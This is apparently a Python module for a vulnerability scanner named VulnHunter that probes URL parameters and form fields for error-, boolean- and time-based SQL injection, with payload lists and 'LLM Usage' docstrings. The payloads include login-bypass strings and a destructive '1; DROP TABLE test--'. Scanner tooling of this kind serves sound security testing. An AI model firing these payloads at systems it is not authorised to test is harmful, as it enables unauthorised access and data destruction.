"""
SQL Injection Scanner for VulnHunter
Detects various types of SQL injection vulnerabilities
"""

import re
import time
from typing import Optional, Dict, List, Any
from datetime import datetime
from loguru import logger

from .base_scanner import BaseScanner, ScanResult, Vulnerability
from ..core.http_client import HTTPClient, HTTPRequest, HTTPResponse


class SQLiScanner(BaseScanner):
    """
    SQL Injection vulnerability scanner
    Detects error-based, boolean-based, and time-based SQLi
    """
    
    def __init__(self, http_client: HTTPClient):
        super().__init__(http_client)
        self.name = "SQLi Scanner"
        self.category = "sqli"
        
        # Error-based SQL injection patterns
        self.sql_error_patterns = [
            (r"you have an error in your sql syntax", "MySQL syntax error"),
            (r"warning.*mysql", "MySQL warning"),
            (r"unclosed quotation mark", "MSSQL unclosed quote"),
            (r"quoted string not properly terminated", "Oracle string error"),
            (r"pg_query\(\).*failed", "PostgreSQL error"),
            (r"sqlite.*error", "SQLite error"),
            (r"syntax error.*sql", "Generic SQL syntax error"),
            (r"mysql_fetch", "MySQL fetch error"),
            (r"mysqli_", "MySQLi error"),
            (r"pg_exec", "PostgreSQL exec error"),
            (r"ORA-\d+", "Oracle error code"),
            (r"SQL syntax.*MySQL", "MySQL syntax error"),
            (r"valid MySQL result", "MySQL result error"),
            (r"SQLSTATE\[", "PDO SQL error"),
            (r"SQLite3::query", "SQLite3 error"),
            (r"System\.Data\.SqlClient", ".NET SQL error"),
            (r"Driver.*SQL.*Server", "SQL Server driver error"),
            (r"Access Database Engine", "MS Access error"),
            (r"JET Database Engine", "MS JET error"),
            (r"mysql_num_rows", "MySQL num_rows error"),
            (r"supplied argument is not a valid MySQL", "Invalid MySQL argument"),
        ]
        
        # Error-based payloads
        self.error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1 UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "') OR ('1'='1",
            "1; DROP TABLE test--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1'; SELECT PG_SLEEP(5)--",
        ]
        
        # Boolean-based payloads (true/false pairs)
        self.boolean_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
            (" AND 1=1", " AND 1=2"),
            (" OR 1=1", " OR 1=2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("') AND ('1'='1", "') AND ('1'='2"),
        ]
        
        # Time-based payloads (with expected delay in seconds)
        self.time_payloads = [
            ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
            ("'; SELECT SLEEP(5)--", 5, "MySQL"),
            ("'; SELECT PG_SLEEP(5)--", 5, "PostgreSQL"),
            ("' AND SLEEP(5)--", 5, "MySQL"),
            ("1' AND SLEEP(5)--", 5, "MySQL"),
            ("' OR SLEEP(5)--", 5, "MySQL"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5, "MySQL"),
            ("'; DBMS_LOCK.SLEEP(5);--", 5, "Oracle"),
        ]
        
    def scan_url(self, url: str, method: str = "GET",
                params: Optional[Dict] = None) -> ScanResult:
        """
        Scan a URL for SQL injection vulnerabilities
        
        LLM Usage:
            scanner = SQLiScanner(http_client)
            results = scanner.scan_url("/search", "GET", {"q": "test"})
        """
        self.results = ScanResult(
            scanner_name=self.name,
            target_url=url,
            start_time=datetime.now()
        )
        
        if not params:
            logger.warning("No parameters to test for SQLi")
            self.results.end_time = datetime.now()
            return self.results
        
        # Get baseline response
        if method.upper() == "GET":
            baseline = self.http_client.get(url, params=params)
        else:
            baseline = self.http_client.post_form(url, params)
        self.results.requests_made += 1
        
        # Test each parameter
        for param_name, param_value in params.items():
            self._test_parameter(url, method, params, param_name, baseline)
            
        self.results.end_time = datetime.now()
        return self.results
    
    def scan_form(self, action: str, method: str, 
                 inputs: List[Dict]) -> ScanResult:
        """
        Scan a form for SQL injection
        
        LLM Usage:
            results = scanner.scan_form("/login", "POST", [
                {"name": "username", "type": "text"},
                {"name": "password", "type": "password"}
            ])
        """
        self.results = ScanResult(
            scanner_name=self.name,
            target_url=action,
            start_time=datetime.now()
        )
        
        # Build initial form data
        form_data = {}
        for inp in inputs:
            name = inp.get('name', '')
            if name:
                form_data[name] = inp.get('value', 'test')
        
        # Get baseline
        if method.upper() == "GET":
            baseline = self.http_client.get(action, params=form_data)
        else:
            baseline = self.http_client.post_form(action, form_data)
        self.results.requests_made += 1
        
        # Test each input
        for inp in inputs:
            param_name = inp.get('name', '')
            if param_name and inp.get('type') not in ['hidden', 'submit', 'button']:
                self._test_parameter(action, method, form_data, param_name, baseline)
                
        self.results.end_time = datetime.now()
        return self.results
    
    def _test_parameter(self, url: str, method: str, params: Dict,
                       param_name: str, baseline: HTTPResponse):
        """Test a single parameter for SQLi"""
        original_value = params.get(param_name, '')
        
        # Test error-based SQLi
        self._test_error_based(url, method, params, param_name, original_value)
        
        # Test boolean-based SQLi
        self._test_boolean_based(url, method, params, param_name, original_value, baseline)
        
        # Test time-based SQLi (only if nothing found yet for this param)
        param_vulns = [v for v in self.results.vulnerabilities if v.parameter == param_name]
        if not param_vulns:
            self._test_time_based(url, method, params, param_name, original_value)
    
    def _test_error_based(self, url: str, method: str, params: Dict,
                         param_name: str, original_value: str):
        """Test for error-based SQL injection"""
        for payload in self.error_payloads:
            test_params = params.copy()
            test_params[param_name] = original_value + payload
            
            if method.upper() == "GET":
                response = self.http_client.get(url, params=test_params)
            else:
                response = self.http_client.post_form(url, test_params)
            self.results.requests_made += 1
            
            # Check for SQL errors
            error_match = self._detect_error_patterns(response, self.sql_error_patterns)
            
            if error_match:
                vuln = Vulnerability(
                    id=self._create_vuln_id("sqli-error", url, param_name),
                    title=f"SQL Injection (Error-based) in '{param_name}'",
                    description=f"The parameter '{param_name}' is vulnerable to error-based SQL injection. "
                               f"The application returned a database error: {error_match}",
                    severity="critical",
                    category="sqli",
                    url=url,
                    parameter=param_name,
                    method=method,
                    payload=payload,
                    evidence=error_match,
                    remediation="Use parameterized queries or prepared statements. "
                               "Never concatenate user input directly into SQL queries.",
                    cvss_score=9.8,
                    cwe_id="CWE-89",
                    confidence="high",
                )
                self.results.add_vulnerability(vuln)
                logger.info(f"[!] SQLi found in {param_name} with payload: {payload}")
                return  # Found one, move to next parameter
    
    def _test_boolean_based(self, url: str, method: str, params: Dict,
                           param_name: str, original_value: str, 
                           baseline: HTTPResponse):
        """Test for boolean-based SQL injection"""
        for true_payload, false_payload in self.boolean_payloads:
            # Test true condition
            true_params = params.copy()
            true_params[param_name] = original_value + true_payload
            
            if method.upper() == "GET":
                true_response = self.http_client.get(url, params=true_params)
            else:
                true_response = self.http_client.post_form(url, true_params)
            self.results.requests_made += 1
            
            # Test false condition
            false_params = params.copy()
            false_params[param_name] = original_value + false_payload
            
            if method.upper() == "GET":
                false_response = self.http_client.get(url, params=false_params)
            else:
                false_response = self.http_client.post_form(url, false_params)
            self.results.requests_made += 1
            
            # Compare responses
            true_similar_to_baseline = abs(len(true_response.body) - len(baseline.body)) < 100
            false_different = abs(len(false_response.body) - len(baseline.body)) > 100
            
            if true_similar_to_baseline and false_different:
                # This looks like boolean-based SQLi
                vuln = Vulnerability(
                    id=self._create_vuln_id("sqli-boolean", url, param_name),
                    title=f"SQL Injection (Boolean-based) in '{param_name}'",
                    description=f"The parameter '{param_name}' appears vulnerable to boolean-based blind SQL injection. "
                               f"Different responses were observed for true ({len(true_response.body)} bytes) "
                               f"and false ({len(false_response.body)} bytes) conditions.",
                    severity="high",
                    category="sqli",
                    url=url,
                    parameter=param_name,
                    method=method,
                    payload=true_payload,
                    evidence=f"True condition: {len(true_response.body)} bytes, "
                            f"False condition: {len(false_response.body)} bytes",
                    remediation="Use parameterized queries or prepared statements.",
                    cvss_score=8.6,
                    cwe_id="CWE-89",
                    confidence="medium",
                )
                self.results.add_vulnerability(vuln)
                logger.info(f"[!] Boolean-based SQLi found in {param_name}")
                return
    
    def _test_time_based(self, url: str, method: str, params: Dict,
                        param_name: str, original_value: str):
        """Test for time-based SQL injection"""
        for payload, delay, db_type in self.time_payloads[:3]:  # Limit time-based tests
            test_params = params.copy()
            test_params[param_name] = original_value + payload
            
            start_time = time.time()
            
            if method.upper() == "GET":
                response = self.http_client.get(url, params=test_params)
            else:
                response = self.http_client.post_form(url, test_params)
            self.results.requests_made += 1
            
            elapsed = time.time() - start_time
            
            # Check if delay occurred
            if elapsed >= delay - 1:  # Allow 1 second tolerance
                vuln = Vulnerability(
                    id=self._create_vuln_id("sqli-time", url, param_name),
                    title=f"SQL Injection (Time-based) in '{param_name}'",
                    description=f"The parameter '{param_name}' is vulnerable to time-based blind SQL injection. "
                               f"A {delay}s delay payload caused a response time of {elapsed:.1f}s. "
                               f"Database type appears to be: {db_type}",
                    severity="high",
                    category="sqli",
                    url=url,
                    parameter=param_name,
                    method=method,
                    payload=payload,
                    evidence=f"Delay: {delay}s, Response time: {elapsed:.1f}s",
                    remediation="Use parameterized queries or prepared statements.",
                    cvss_score=8.6,
                    cwe_id="CWE-89",
                    confidence="medium",
                )
                self.results.add_vulnerability(vuln)
                logger.info(f"[!] Time-based SQLi found in {param_name} ({db_type})")
                return
    
    def get_payloads(self, payload_type: str = "all") -> List[str]:
        """
        Get SQL injection payloads for manual testing
        
        LLM Usage:
            payloads = scanner.get_payloads("error")  # error, boolean, time, all
        """
        if payload_type == "error":
            return self.error_payloads
        elif payload_type == "boolean":
            return [p[0] for p in self.boolean_payloads]
        elif payload_type == "time":
            return [p[0] for p in self.time_payloads]
        else:
            all_payloads = self.error_payloads.copy()
            all_payloads.extend([p[0] for p in self.boolean_payloads])
            all_payloads.extend([p[0] for p in self.time_payloads])
            return all_payloads
